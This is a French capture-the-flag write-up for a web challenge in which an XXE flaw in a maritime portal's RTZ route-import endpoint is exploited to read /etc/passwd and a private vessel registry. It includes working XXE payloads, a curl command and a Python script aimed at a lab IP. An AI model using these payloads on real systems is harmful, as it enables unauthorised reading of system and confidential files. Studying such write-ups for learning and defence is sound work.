---
title: "Sail Away · Flow In"
platform: "HackerLab Benin 2026 (H4ckd4ne)"
category: "web"
difficulty: "—"
points: 150
os: "—"
date: 2026-11-20
author: "Sh1n"
author_github: "H4ckd4ne"
source: "https://github.com/H4ckd4ne/hackerlab2026-writeups/blob/main/sail-away/flow-in/writeup-flow-in.md"
license: "CC BY-SA 4.0"
status: published
---

# Flow in — Sail Away (Web, 150 pts, q:2)

## Objectif

Le portail **Citadel VTS** publie le trafic maritime du port. Le yacht **RAVN**
appareille cette nuit ; sa fiche est réservée aux comptes habilités. Il faut
retrouver son itinéraire (et la clearance associée) sans attendre le traitement
de la demande officielle.

Cible de l'instance : `http://172.28.7.2:8080` (IP variable selon l'instance,
réseau VPN `172.28.7.0/24`).

## État initial

- Page `Citadel VTS — Consultation du trafic maritime`.
- `GET /api/vessels` liste sept navires, dont :

```json
{
  "id": "ravn",
  "name": "RAVN",
  "flag": "Norveth",
  "private": true,
  "type": "Yacht à moteur · Pleasure Craft"
}
```

- `GET /api/vessel/ravn` renvoie `403 FORBIDDEN` :

```json
{"error":"private","message":"Navire privé — suivi réservé aux comptes habilités."}
```

- L'onglet **Import de routes** accepte un fichier RTZ (XML) et le valide via
  `POST /api/route/import` (Content-Type `application/xml`).

## Reconnaissance

Le formulaire d'import renvoie dans sa réponse JSON le champ `note` extrait de
l'élément `<citadelImport><note>`. Le parseur XML résout les entités externes :
c'est un **XXE**.

Preuve de lecture de fichier :

```bash
cat > xxe.rtz <<'XML'
<?xml version="1.0"?>
<!DOCTYPE route [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<route version="1.1" xmlns="http://www.cirm.org/RTZ/1/1">
  <routeInfo routeName="p" routeStatus="original"/>
  <waypoints><waypoint id="1" name="a"><position lat="1" lon="1"/></waypoint></waypoints>
  <extensions><citadelImport><note>&xxe;</note></citadelImport></extensions>
</route>
XML

curl -s -X POST -H 'Content-Type: application/xml' \
  --data-binary @xxe.rtz http://172.28.7.2:8080/api/route/import
```

La réponse contient `root:x:0:0:root:/root:/bin/bash...` dans `note`.

## Exploitation

Le registre privé est stocké dans :

```text
/srv/vts/data/private_vessels.json
```

On lit ce fichier avec le même XXE, puis on extrait l'entrée `ravn` :

```python
import json, urllib.request

BASE = "http://172.28.7.2:8080"
RTZ = ('<?xml version="1.0"?>\n'
       '<!DOCTYPE route [<!ENTITY xxe SYSTEM "file:///srv/vts/data/private_vessels.json">]>\n'
       '<route version="1.1" xmlns="http://www.cirm.org/RTZ/1/1">'
       '<routeInfo routeName="p" routeStatus="original"/>'
       '<waypoints><waypoint id="1" name="a"><position lat="1" lon="1"/></waypoint></waypoints>'
       '<extensions><citadelImport><note>&xxe;</note></citadelImport></extensions></route>')

req = urllib.request.Request(BASE + "/api/route/import", data=RTZ.encode(),
                             headers={"Content-Type": "application/xml"})
data = json.loads(json.load(urllib.request.urlopen(req))["note"])
ravn = next(v for v in data["vessels"] if v.get("id") == "ravn")
print(ravn["voyage"])
print(ravn["clearance"])
```

Le registre contient le voyage du RAVN :

```text
Citadel (TV CTD) -> Norhavn (NV HVN)
via Écluse Est (Östersluss)
ETA écluse : 23:40Z
```

Le champ `clearance` du RAVN est la valeur attendue par le challenge. Elle a été
soumise à la plateforme et n'est pas recopiée ici.

## Pistes qui n'ont pas abouti

- **IDOR** sur `/api/vessel/ravn` et `/api/vessel/orvar` : `403`, le contrôle
  d'accès est bien côté serveur.
- **SSTI** dans `<note>` : `{{7*7}}` est renvoyé littéralement, le champ n'est
  pas évalué par un moteur de template.
- **Login** `api/login` : aucun compte opérateur fourni ; inutile, le XXE donne
  directement le registre privé.
- Le chemin `/srv/vts/data/private_vessels.json` est le chemin par défaut du
  registre ; une fuite du bloc `debug` via `/proc/self/cmdline` peut le
  confirmer sur d'autres instances.

## Validation reproductible

1. Vérifier `GET /api/vessels` : le RAVN est présent avec `"private": true`.
2. Vérifier `GET /api/vessel/ravn` : `403`.
3. Envoyer le RTZ XXE ci-dessus : `/etc/passwd` apparaît dans `note`.
4. Envoyer le RTZ XXE ciblant `/srv/vts/data/private_vessels.json` : le JSON
   contient `ravn.voyage` et `ravn.clearance`.
5. Soumettre `ravn.clearance` au challenge : la plateforme l'accepte.
